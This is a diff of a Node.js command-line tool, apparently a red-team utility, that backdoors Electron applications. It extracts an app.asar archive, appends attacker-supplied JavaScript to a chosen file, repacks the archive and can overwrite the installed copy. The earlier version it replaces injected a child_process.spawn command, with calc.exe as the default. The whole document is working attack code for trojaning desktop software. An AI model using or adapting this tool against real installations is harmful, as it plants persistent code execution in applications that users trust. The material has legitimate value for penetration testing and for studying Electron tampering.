@@ -1,124 +1,194 @@
 const asar = require("asar");
-const {program} = require("commander");
+const { program } = require("commander");
 const { questionInt } = require("readline-sync");
-const { copyFile, readdir, readFile, writeFile, rename, stat, mkdir } = require("node:fs/promises"); 
-const {copy, ensureDir} = require("fs-extra");
+const { copyFile, readdir, readFile, writeFile, rename, stat, mkdir } = require("node:fs/promises");
+const { copy, ensureDir } = require("fs-extra");
 const path = require("path");
+
 const EVIL_DIR = "evil";
 
 async function retrieveAsar(asarPath) {
-    console.log(`[+] Copying asar files...`);
-    const localAsar = "./" + path.basename(asarPath);
-    const localAsarUnpacked = localAsar + ".unpacked";
-    await copy(asarPath, localAsar);
-    await copy(`${asarPath}.unpacked`, localAsarUnpacked);
+    console.log("[+] Copying asar files...");
+    const localAsar = path.join(".", path.basename(asarPath));
+    const localAsarUnpacked = `${localAsar}.unpacked`;
+
+    try {
+        await copy(asarPath, localAsar);
+        await copy(`${asarPath}.unpacked`, localAsarUnpacked);
+    } catch (error) {
+        console.error(`[!] Error copying asar files: ${error.message}`);
+        process.exit(1);
+    }
 }
 
 async function findJS(inputFile) {
-    const contents = asar.listPackage(inputFile);
-    const jsFiles = contents.filter(f => (
-        (f.indexOf(".js") == f.length - 3) 
-        && (f.indexOf(".json") < 0 ) 
-        && (f.indexOf("node_modules") < 0 )
-    ));
-    console.log("[+] Found the following JS files: ");
-    for (let i=0; i <= jsFiles.length; i++) {
-        console.log(`${i}: ${jsFiles[i]}`);
+    try {
+        const contents = asar.listPackage(inputFile);
+        const jsFiles = contents.filter(f =>
+            f.endsWith(".js") &&
+            !f.includes(".json") &&
+            !f.includes("node_modules")
+        );
+
+        if (jsFiles.length === 0) {
+            console.error("[!] No suitable JS files found");
+            process.exit(1);
+        }
+
+        console.log("[+] Found the following JS files:");
+        jsFiles.forEach((file, index) => {
+            console.log(`${index}: ${file}`);
+        });
+
+        const patchChoice = questionInt("Which JS File shall we patch? ");
+
+        if (patchChoice < 0 || patchChoice >= jsFiles.length) {
+            console.error("[!] Invalid file selection");
+            process.exit(1);
+        }
+
+        const patchFile = jsFiles[patchChoice];
+        console.log(`[+] Okay, patching ${patchFile}`);
+        return patchFile;
+    } catch (error) {
+        console.error(`[!] Error finding JS files: ${error.message}`);
+        process.exit(1);
     }
-    const patchChoice = questionInt("Which JS File shall we patch? ");
-    const patchFile = jsFiles[patchChoice];
-    console.log(`[+] Okay, patching ${patchFile}`);
-    return patchFile;
 }
 
-async function unpackedCheck(inputFile) {
-    return await ensureDir(`${inputFile}.unpacked`);
+async function ensureUnpackedExists(inputFile) {
+    try {
+        await ensureDir(`${inputFile}.unpacked`);
+        return true;
+    } catch (error) {
+        console.error(`[!] Error checking/creating unpacked directory: ${error.message}`);
+        return false;
+    }
 }
 
 async function pack(inputFile) {
-    console.log("[+] Determine excludes");
-    // Analyze the unpacked file to determine what to keep out
-    // of the packed  archive
-    const unpackedPaths = await readdir(`${inputFile}.unpacked`);
-    let unpackDirs;
-    if (unpackedPaths.length > 1) {
-        unpackDirs = "{" + unpackedPaths.join(",") + "}";
-    } else {
-        unpackDirs = unpackedPaths[0];
-    }
+    try {
+        console.log("[+] Determining excludes");
+        const unpackedPaths = await readdir(`${inputFile}.unpacked`);
 
-    console.log(`[+] Excluding ${unpackDirs}`);
-    console.log(`[+] Creating evil ASAR File: ${inputFile}`);
-    // process.exit(-1);
-    await asar.createPackageWithOptions(`.${path.sep}${EVIL_DIR}/${inputFile}.extracted`, `.${path.sep}${EVIL_DIR}/${inputFile}`, {unpackDir: unpackDirs});
+        const unpackDirs = unpackedPaths.length > 1
+            ? `{${unpackedPaths.join(",")}}`
+            : unpackedPaths[0];
+
+        console.log(`[+] Excluding ${unpackDirs}`);
+        console.log(`[+] Creating modified ASAR File: ${inputFile}`);
+
+        await asar.createPackageWithOptions(
+            path.join(".", EVIL_DIR, `${inputFile}.extracted`),
+            path.join(".", EVIL_DIR, inputFile),
+            { unpackDir: unpackDirs }
+        );
+    } catch (error) {
+        console.error(`[!] Error packing ASAR: ${error.message}`);
+        process.exit(1);
+    }
 }
 
-async function mutate(asarFile, jsFile, command) {
-    console.log(`[+] Adding command ${command}`)
-    const jsPath = `.${path.sep}${EVIL_DIR}/${asarFile}.extracted${jsFile}`;
-    let jsText = await readFile(jsPath);
-    jsText = jsText.toString();
-    let cmd = `\nconst tagg = require("child_process");\n`
-    cmd += `tagg.spawn("${command}");`
-    await writeFile(jsPath, jsText + cmd);
+async function mutate(asarFile, jsFile, injectionFile) {
+    try {
+        console.log(`[+] Injecting contents from: ${injectionFile}`);
+        const jsPath = path.join(".", EVIL_DIR, `${asarFile}.extracted`, jsFile);
+        const originalContent = (await readFile(jsPath)).toString();
+        const injectionContent = (await readFile(injectionFile)).toString();
+
+        await writeFile(jsPath, originalContent + "\n" + injectionContent);
+        console.log("[+] File contents injected successfully");
+    } catch (error) {
+        console.error(`[!] Error injecting file contents: ${error.message}`);
+        process.exit(1);
+    }
 }
 
 async function writeEvil(inputFile, newAsarPath) {
-    console.log("[+] Backing Up asar assets");
-    await rename(inputFile, `${inputFile}.bak`);
-    await rename(`${inputFile}.unpacked`, `${inputFile}.unpacked.bak`);
-    console.log("[+] Copying Evil");
-    await copyFile(`.${path.sep}${EVIL_DIR}/${newAsarPath}`, inputFile);
-    await copy(`.${path.sep}${EVIL_DIR}/${newAsarPath}.unpacked`, `${inputFile}.unpacked`);
+    try {
+        console.log("[+] Backing up original ASAR assets");
+        await rename(inputFile, `${inputFile}.bak`);
+        await rename(`${inputFile}.unpacked`, `${inputFile}.unpacked.bak`);
+
+        console.log("[+] Copying modified files");
+        await copyFile(path.join(".", EVIL_DIR, newAsarPath), inputFile);
+        await copy(
+            path.join(".", EVIL_DIR, `${newAsarPath}.unpacked`),
+            `${inputFile}.unpacked`
+        );
+    } catch (error) {
+        console.error(`[!] Error writing modified files: ${error.message}`);
+        process.exit(1);
+    }
 }
 
 async function unpack(inputFile) {
-    if (unpackedCheck(inputFile)) {
-        console.log("[+] Unpacked dir exists");
-    } else {
-        console.log[`[!] Missing ${inputFile}.unpacked directory!`];
-        process.exit(-1);
+    try {
+        if (!await ensureUnpackedExists(inputFile)) {
+            console.error(`[!] Missing ${inputFile}.unpacked directory!`);
+            process.exit(1);
+        }
+
+        console.log("[+] Extracting ASAR");
+        await asar.extractAll(
+            inputFile,
+            path.join(EVIL_DIR, `${inputFile}.extracted`)
+        );
+    } catch (error) {
+        console.error(`[!] Error unpacking ASAR: ${error.message}`);
+        process.exit(1);
     }
-    console.log("[+] Extracting ASAR");
-    asar.extractAll(inputFile, `${EVIL_DIR}/${inputFile}.extracted`);    
 }
 
-
 async function main() {
-    
-    program.option("-i, --input <inputFile>", "asar file to mutate", "app.asar");
-    program.option("-c, --command <command>", "command to insert", "calc.exe");
-    program.option("-w --write ", "write evil files directly to application dir");
-
-    program.parse(process.argv);
+    program
+        .option("-i, --input <inputFile>", "asar file to modify", "app.asar")
+        .option("-f, --file <injectionFile>", "JS file to inject")
+        .option("-w, --write", "write modified files directly to application dir")
+        .parse(process.argv);
 
     const options = program.opts();
 
-    // Make evil dir
+    if (!options.file) {
+        console.error("[!] Missing required --file option");
+        process.exit(1);
+    }
+
     try {
-        await stat(EVIL_DIR)
+        try {
+            await stat(options.file);
+        } catch {
+            console.error("[!] Injection file not found:", options.file);
+            process.exit(1);
+        }
+
+        try {
+            await stat(EVIL_DIR);
+        } catch {
+            await mkdir(EVIL_DIR);
+        }
+
+        let newAsarPath = options.input;
+        if (path.basename(options.input) !== options.input) {
+            await retrieveAsar(options.input);
+            newAsarPath = path.basename(options.input);
+        }
+
+        const patchFile = await findJS(newAsarPath);
+        await unpack(newAsarPath);
+        await mutate(newAsarPath, patchFile, options.file);
+        await pack(newAsarPath);
+
+        if (options.write) {
+            await writeEvil(options.input, newAsarPath);
+            console.log("[+] Modified assets copied. Remember to restore the originals!");
+        } else {
+            console.log("[+] Done! Move the new app.asar and app.asar.unpacked into place");
+        }
     } catch (error) {
-        await mkdir(EVIL_DIR);    
+        console.error(`[!] Fatal error: ${error.message}`);
+        process.exit(1);
     }
-
-    let newAsarPath = options.input;
-    // Copy asar if it's not local to the dir
-    if (path.basename(options.input) != options.input) {
-        await retrieveAsar(options.input);
-        newAsarPath = path.basename(options.input);
-    }
-    const patchFile = await findJS(newAsarPath);
-    await unpack(newAsarPath);
-    await mutate(newAsarPath, patchFile, options.command);
-    await pack(newAsarPath);
-
-    if (options.write) {
-        await writeEvil(options.input, newAsarPath);
-        console.log("[+] Evil assets copied over. Don't forget to restore the originals!");
-    } else {
-        console.log("[+] Done! Move the new app.asar and app.asar.unpacked into place");
-    }
-
 }
 
-main();
+main().then();
